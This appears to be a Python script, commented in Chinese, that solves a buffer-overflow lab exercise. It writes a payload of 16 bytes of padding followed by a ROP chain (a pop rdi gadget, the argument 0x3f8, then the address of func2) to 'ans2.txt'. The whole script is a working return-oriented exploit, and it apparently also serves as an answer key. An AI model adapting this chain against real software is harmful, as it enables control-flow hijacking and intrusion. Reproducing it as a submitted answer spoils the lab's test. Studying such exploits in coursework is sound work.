import struct

# 1. 准备地址
pop_rdi_ret = 0x4012c7  # gadget 地址
target_func = 0x401216  # func2 地址
arg_value   = 0x3f8     # 需要传递的参数 1016

# 2. 构造 Payload
# 偏移量 16 字节
padding = b'A' * 16

# 构造 ROP 链
# 这里的逻辑是：跳转到 pop_rdi -> 栈上的数据 0x3f8 被弹入 rdi -> 返回到 func2
rop_chain = struct.pack('<Q', pop_rdi_ret) + \
            struct.pack('<Q', arg_value) + \
            struct.pack('<Q', target_func)

payload = padding + rop_chain

# 3. 写入文件
filename = "ans2.txt"
with open(filename, "wb") as f:
    f.write(payload)

print(f"Payload written to {filename}")